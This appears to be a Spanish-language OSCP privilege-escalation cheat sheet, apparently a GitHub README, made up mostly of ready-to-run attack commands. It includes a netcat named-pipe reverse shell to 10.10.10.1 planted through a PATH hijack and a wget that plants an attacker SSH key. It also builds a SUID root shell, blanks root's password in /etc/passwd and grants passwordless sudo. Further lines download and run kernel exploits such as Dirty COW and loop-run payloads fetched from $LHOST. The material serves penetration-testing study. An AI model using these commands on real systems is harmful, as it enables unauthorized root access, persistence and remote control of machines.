Linux: https://github.com/pedroarias1015/oscp/blob/master/escalacion/README.md#elevacion-de-privilegios-linux
Windows: https://github.com/pedroarias1015/oscp/blob/master/escalacion/README.md#elevacion-de-privilegios-windows

# Elevacion de privilegios LINUX

## Spawing shell

1) Shell interactiva --> `python -c 'import pty; pty.spawn("/bin/sh")'; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export TERM=xterm; export SHELL=bash`

2) Add public key to authorized keys  --> `echo $(wget http:/$LHOST/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys`

## Informacion SO

3) Distribucion de linux y version --> `cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;`

4) Arquitectura de sistema y kernel --> `$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release`

5) Variables de entorno             --> `cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set`

## Directorios y procesos

6) Bit SUID y SGID                  --> `printf "-------SUID-------\n\n"; find / -perm -u=s -type f 2>/dev/null; printf "-------GUID-------\n\n"; find / -perm -g=s -type f 2>/dev/null`

7) Listar los procesos corriendo como root, permisos y NFS exports --> `echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`

8) Listar directorios con permisos de lectura, escritura y ejecución --> 
<pre>
Permisos de W    -->  find / -writable -type d 2>/dev/null
Permisos de W    -->  find / -perm -222 -type d 2>/dev/null
Permisos de W    -->  find / -perm -o w -type d 2>/dev/null    
Permisos de X    -->  find / -perm -o x -type d 2>/dev/null
Permisos de W+X  -->  find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
Permisos de R    -->  find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
</pre>


9) Encontrar binarios interesantes             -->  `find / -name wget; find / -name nc*; find / -name netcat*; find / -name tftp*; find / -name ftp`

## Reconocimiento automatico

10) LinuxPrivChecker --> `cp $OSCP/escalacion/linuxprivchecker.py lpc.py`

11) Linux Exploit Suggester --> `cp $OSCP/escalacion/les.sh .`

12) Linux Exploit Suggester perl --> `cp $OSCP/escalacion/Linux_Exploit_Suggester.pl les.pl`

## Utilidades

13) Alterar el PATH para un fichero SUID que invoca a otro --> `set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"; echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh ; chmod +x ssh`

14) Generar una shell con SUID --> `echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c`

15) Si /etc/passwd tiene permisos incorrectos --> `echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su`

16) Añadir al usuario www-data a sudoers sin password --> `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`

17) Compartir carpeta RDP --> `rdesktop -u <USUARIO> -p <CONTRASEÑA> <IP> -r disk:remote_folder=<LOCAL_PATH> -g $(xrandr -q | awk '/ connected / {print $4;exit}' | awk -F "x" '{print int($1/1.05)"x"int($2/1.1)}')`


## Compilacion

18) Incluir path --> `gcc -B /usr/bin file.c -o compiled`

19) Solucionar error de target  --> `gcc file.c -o compiled -Wl,--hash-style=both`

## Exploits satisfactorios

20) __Exploits precompilados para Linux__ https://github.com/lucyoa/kernel-exploits  `git clone https://github.com/lucyoa/kernel-exploits.git` 

21) __CLAVE: Windows exploits precompilados__ https://github.com/SecWiki/windows-kernel-exploits

22) __CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8__ https://www.exploit-db.com/exploits/15285

23) __Linux Kernel <= 2.6.37 'Full-Nelson.c'__ https://www.exploit-db.com/exploits/15704/

24) __CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)__ https://git.zx2c4.com/CVE-2012-0056/about/

25) __Linux CVE 2012-0056__ `wget -O mem.c http://www.exploit-db.com/download/18411; gcc -o mem mem.c`

26) __CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8__ https://dirtycow.ninja/ `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`
`wget https://www.exploit-db.com/download/40839 -O dirty.c; gcc -pthread dirty.c -o dirty -lcrypt`

27) __Linux 2.6.32__ https://www.exploit-db.com/exploits/15285/ 

28) __CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)__ 
<pre>
wget -O 14814.c http://www.exploit-db.com/download/14814
gcc 14814.c -o can
</pre>

29) __Elevation in 2.6.x__ `for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://$LHOST/$a; chmod +x $a; ./$a; id; done`

# Elevacion de privilegios WINDOWS

## Utilidades
20) Ejemplo escapado de caracteres en Windows --> `echo net user rady rady /add 1^> "C:\Documents and Settings\Backup\net4.log" 2^>^&1 > backup-python.cmd`
